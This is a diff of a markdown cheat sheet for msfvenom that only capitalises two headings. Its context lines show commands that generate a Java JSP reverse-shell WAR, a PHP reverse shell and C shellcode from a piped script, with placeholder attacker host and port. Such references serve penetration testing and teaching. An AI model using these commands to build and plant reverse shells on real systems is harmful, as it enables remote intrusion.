@@ -1,4 +1,4 @@
-### list available formats (or payloads, archs, platforms, etc)
+### List available formats (or payloads, archs, platforms, etc)
 ```
 msfvenom -l format
 ```
@@ -54,7 +54,7 @@ msfvenom -p java/jsp_shell_reverse_tcp lhost=<lhost> lport=<lport> -f war > <fil
 msfvenom -p php/reverse_php lhost=<lhost> lport=<lport> -f raw > <file>.php
 ```
 
-### specify custom input
+### Specify custom input
 ```
 cat test.sh | msfvenom -p - -a x86_64 --platform linux -f c
 ```
